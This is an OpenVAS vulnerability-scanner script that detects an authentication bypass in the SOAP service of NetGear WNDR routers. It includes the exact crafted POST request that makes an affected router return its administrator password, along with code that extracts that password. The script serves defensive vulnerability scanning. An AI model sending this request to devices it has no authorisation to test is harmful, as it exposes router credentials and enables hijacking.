###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_netgear_auth_bypass_02_15.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# NetGear WNDR Authentication Bypass / Information Disclosure
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105223");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("$Revision: 13659 $");

  script_name("NetGear WNDR Authentication Bypass / Information Disclosure");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Feb/56");

  script_tag(name:"impact", value:"Affected devices can be interrogated and hijacked");
  script_tag(name:"affected", value:"Platforms / Firmware confirmed affected:

  NetGear WNDR3700v4 - V1.0.0.4SH

  NetGear WNDR3700v4 - V1.0.1.52

  NetGear WNR2200 - V1.0.1.88

  NetGear WNR2500 - V1.0.0.24

  Additional platforms believed to be affected:

  NetGear WNDR3800

  NetGear WNDRMAC

  NetGear WPN824N

  NetGear WNDR4700");

  script_tag(name:"vuldetect", value:"Send a special crafted POST request and check the response");

  script_tag(name:"solution", value:"Ask the vendor for an update. Ensure remote WAN management is disabled on the affected devices.
  Only allow trusted devices access to the local network.");

  script_tag(name:"summary", value:"A number of NetGear WNDR devices contain an embedded SOAP service that
  is seemingly for use with the NetGear Genie application. This service allows for viewing and setting of certain
  router parameters. This SOAP service is prone to an authentication bypass.");

  script_tag(name:"solution_type", value:"Workaround");
  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2015-02-19 16:42:31 +0100 (Thu, 19 Feb 2015)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );
useragent = http_get_user_agent();
host = http_host_name( port:port );


req = 'POST / HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'Accept: */*; q=0.5, application/xml\r\n' +
      'Accept-Encoding: identity\r\n' +
      'Soapaction: urn:NETGEAR-ROUTER:service:LANConfigSecurity:1#GetInfo\r\n' +
      'Content-Length: 1\r\n' +
      'Content-Type: application/x-www-form-urlencoded\r\n' +
      'User-Agent: ' + useragent + '\r\n' +
      '\r\n' +
      '=';

buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
if( buf !~ "^HTTP/1\.[01] 200" || ( "GetInfoResponse" >!< buf || "NewPassword" >!< buf ) ) exit( 0 );

pass = eregmatch( pattern:'<NewPassword>([^<]+)</NewPassword>', string:buf );
if( ! isnull( pass[1] ) ) password = pass[1];

if( password )
{
  report = 'It was possible to retrieve the password "' + password + '" from the remote Netgear Router.\n';
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 0 );